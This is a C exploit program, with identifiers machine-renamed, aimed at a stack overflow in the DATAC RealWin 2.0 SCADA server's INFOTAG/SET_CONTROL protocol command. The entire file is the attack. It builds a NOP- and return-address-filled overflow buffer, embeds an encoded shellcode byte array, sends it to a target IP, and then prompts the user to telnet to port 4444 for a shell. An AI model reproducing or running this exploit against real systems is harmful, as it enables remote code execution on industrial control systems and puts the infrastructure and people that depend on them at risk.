
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_4__ TYPE_2__ ;
typedef struct TYPE_3__ TYPE_1__ ;


struct TYPE_3__ {int s_addr; } ;
struct sockaddr_in {TYPE_1__ sin_addr; int sin_port; int sin_family; } ;
struct sockaddr {int dummy; } ;
typedef int sockaddr_in ;
typedef int scode ;
typedef int WSADATA ;
typedef int ULONG_PTR ;
struct TYPE_4__ {char* szTarget; int retAddr; } ;
typedef int SOCKET ;
typedef int BYTE ;


 int VAR_0 ;
 int VAR_1 ;
 int VAR_2 ;
 int VAR_3 ;
 int VAR_4 ;
 int VAR_5 ;
 int VAR_6 ;
 int VAR_7 ;
 int FUNC_0 (int) ;
 int FUNC_1 () ;
 int FUNC_2 (int,int *) ;
 size_t FUNC_3 (char*) ;
 scalar_t__ FUNC_4 (int,int) ;
 int FUNC_5 (int ) ;
 scalar_t__ FUNC_6 (int ,struct sockaddr*,int) ;
 int FUNC_7 (int ) ;
 int FUNC_8 (int ) ;
 int FUNC_9 (char*) ;
 int FUNC_10 (void*,unsigned char*,int) ;
 int FUNC_11 (void*,int,int) ;
 int FUNC_12 (char*,...) ;
 int FUNC_13 (int ,char*,int,int ) ;
 int FUNC_14 (int ,char*,int,int ) ;
 int FUNC_15 (int ,int ,int ) ;
 int FUNC_16 (char*) ;
 TYPE_2__* VAR_8 ;

int FUNC_17(int VAR_9, char* VAR_10[])
{
        WSADATA VAR_11;
        SOCKET VAR_12, VAR_13;
        char VAR_14[0x10] = {0};
        struct sockaddr_in VAR_15;
        char *VAR_16 = ((void*)0);
        char *VAR_17 = ((void*)0);
        ULONG_PTR VAR_18;


        unsigned char VAR_19[] =
        "\x29\xc9\x83\xe9\xb0\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\xa5"
        "\xd8\xfb\x1b\x83\xeb\xfc\xe2\xf4\x59\xb2\x10\x56\x4d\x21\x04\xe4"
        "\x5a\xb8\x70\x77\x81\xfc\x70\x5e\x99\x53\x87\x1e\xdd\xd9\x14\x90"
        "\xea\xc0\x70\x44\x85\xd9\x10\x52\x2e\xec\x70\x1a\x4b\xe9\x3b\x82"
        "\x09\x5c\x3b\x6f\xa2\x19\x31\x16\xa4\x1a\x10\xef\x9e\x8c\xdf\x33"
        "\xd0\x3d\x70\x44\x81\xd9\x10\x7d\x2e\xd4\xb0\x90\xfa\xc4\xfa\xf0"
        "\xa6\xf4\x70\x92\xc9\xfc\xe7\x7a\x66\xe9\x20\x7f\x2e\x9b\xcb\x90"
        "\xe5\xd4\x70\x6b\xb9\x75\x70\x5b\xad\x86\x93\x95\xeb\xd6\x17\x4b"
        "\x5a\x0e\x9d\x48\xc3\xb0\xc8\x29\xcd\xaf\x88\x29\xfa\x8c\x04\xcb"
        "\xcd\x13\x16\xe7\x9e\x88\x04\xcd\xfa\x51\x1e\x7d\x24\x35\xf3\x19"
        "\xf0\xb2\xf9\xe4\x75\xb0\x22\x12\x50\x75\xac\xe4\x73\x8b\xa8\x48"
        "\xf6\x8b\xb8\x48\xe6\x8b\x04\xcb\xc3\xb0\xea\x47\xc3\x8b\x72\xfa"
        "\x30\xb0\x5f\x01\xd5\x1f\xac\xe4\x73\xb2\xeb\x4a\xf0\x27\x2b\x73"
        "\x01\x75\xd5\xf2\xf2\x27\x2d\x48\xf0\x27\x2b\x73\x40\x91\x7d\x52"
        "\xf2\x27\x2d\x4b\xf1\x8c\xae\xe4\x75\x4b\x93\xfc\xdc\x1e\x82\x4c"
        "\x5a\x0e\xae\xe4\x75\xbe\x91\x7f\xc3\xb0\x98\x76\x2c\x3d\x91\x4b"
        "\xfc\xf1\x37\x92\x42\xb2\xbf\x92\x47\xe9\x3b\xe8\x0f\x26\xb9\x36"
        "\x5b\x9a\xd7\x88\x28\xa2\xc3\xb0\x0e\x73\x93\x69\x5b\x6b\xed\xe4"
        "\xd0\x9c\x04\xcd\xfe\x8f\xa9\x4a\xf4\x89\x91\x1a\xf4\x89\xae\x4a"
        "\x5a\x08\x93\xb6\x7c\xdd\x35\x48\x5a\x0e\x91\xe4\x5a\xef\x04\xcb"
        "\x2e\x8f\x07\x98\x61\xbc\x04\xcd\xf7\x27\x2b\x73\x4a\x16\x1b\x7b"
        "\xf6\x27\x2d\xe4\x75\xd8\xfb\x1b";

        int VAR_20,VAR_21;

        FUNC_16("cls");
        FUNC_12("\n\t\t- DATAC RealWin 2.0 SCADA Software -\n");
        FUNC_12("\tProtocol Command INFOTAG/SET_CONTROL Stack Overflow\n");
        FUNC_12("\nRuben Santamarta - reversemode.com \n\n");

        if( VAR_9 < 3 )
        {

                FUNC_12("\nusage: exploit.exe ip TargetNumber");
                FUNC_12("\n\nexample: exploit 192.168.1.44 1\n\n");
                for( VAR_20 = 0; VAR_8[VAR_20].szTarget; VAR_20++ )
                {
                        FUNC_12("\n[ %d ] - %s", VAR_20, VAR_8[VAR_20].szTarget);
                }
                FUNC_12("\n");
                FUNC_7(0);
        }

        FUNC_2(0x0202,&VAR_11);

        VAR_15.sin_family = VAR_0;
        VAR_15.sin_port = FUNC_8( VAR_6 );
        VAR_15.sin_addr.s_addr = FUNC_9( VAR_10[1] );

        VAR_12 = FUNC_15(VAR_0, VAR_7, 0);

        if ( FUNC_6(VAR_12, (struct sockaddr*) &VAR_15, sizeof(sockaddr_in)) )
        {
                FUNC_12("\n[!!] Host unreachable :( \n\n");
                FUNC_7(0);
        }

        VAR_16 = (char*) FUNC_4( VAR_1, sizeof(char) );
        VAR_17 = (char*) FUNC_4( VAR_5, sizeof(char) );

        FUNC_11( (void*)VAR_16, 0x90, VAR_1);
        FUNC_11( (void*)VAR_17, 0x90, VAR_5);

        VAR_18 = VAR_8[FUNC_3(VAR_10[2])].retAddr;

        for( VAR_20=0x0; VAR_20< 0xbe; VAR_20++)
        {
                *( ( ULONG_PTR* ) (BYTE*)(VAR_16 + VAR_20*sizeof(ULONG_PTR) +2 ) ) = VAR_18;
        }


        *( ( ULONG_PTR* ) (BYTE*)(VAR_16 + 0xbe*sizeof(ULONG_PTR) +2 ) ) = 0x404040;


        *( ( ULONG_PTR* ) VAR_16 ) = VAR_4;


        *( ( ULONG_PTR* ) VAR_16 + 1 ) = 0x800;


        *( (ULONG_PTR*)(( BYTE*) VAR_16 + 10 ) ) = VAR_2;


        *( (ULONG_PTR*)(( BYTE*) VAR_16 + 14 ) ) = 0x4;


        *( (ULONG_PTR*)(( BYTE*) VAR_16 + 44 ) ) = 0xDEADBEEF;


        FUNC_10( (void*)((char*)VAR_16 + VAR_1 - sizeof(VAR_19))
                        ,VAR_19
                        ,sizeof(VAR_19)-1);

        FUNC_14(VAR_12, VAR_16, VAR_1, 0 );

        FUNC_12("[+] Exploit packet sent...now checking host availability\n");


        *( ( ULONG_PTR* ) VAR_17 ) = VAR_4;


        *( ( ULONG_PTR* ) VAR_17 + 1 ) = 0x20;


        *( (ULONG_PTR*)(( BYTE*) VAR_17 + 10 ) ) = VAR_3;


        *( (ULONG_PTR*)(( BYTE*) VAR_17 + 14 ) ) = 0x1;


        *( (ULONG_PTR*)(( BYTE*) VAR_17 + 44 ) ) = 0xDEADBEEF;

        VAR_13 = FUNC_15(VAR_0, VAR_7, 0);

        if ( FUNC_6(VAR_13, (struct sockaddr*) &VAR_15, sizeof(sockaddr_in)) )
        {
                FUNC_12("\n[!!] Host died, long live to the Host!  \n\n");
                FUNC_7(0);
        }

        VAR_20 = FUNC_13(VAR_13, VAR_14, 0x8, 0 );

        if( VAR_20 )
        {
                FUNC_12("[+] The host is up and running\n\t:: %d bytes received: ",VAR_20);
                for( VAR_21 = 0; VAR_21<VAR_20; VAR_21++)
                        FUNC_12("%02X ", (unsigned char)VAR_14[VAR_21]);

                FUNC_12("\n");
        }else {
                FUNC_12("\n[!!] Host died, long live to the Host!  \n\n");
        }

        FUNC_5(VAR_13);
        FUNC_5(VAR_12);

        FUNC_0(1000);
        FUNC_12("\n[+] Try: telnet %s 4444\n\n",VAR_10[1]);
        FUNC_1();

        return 0;
}
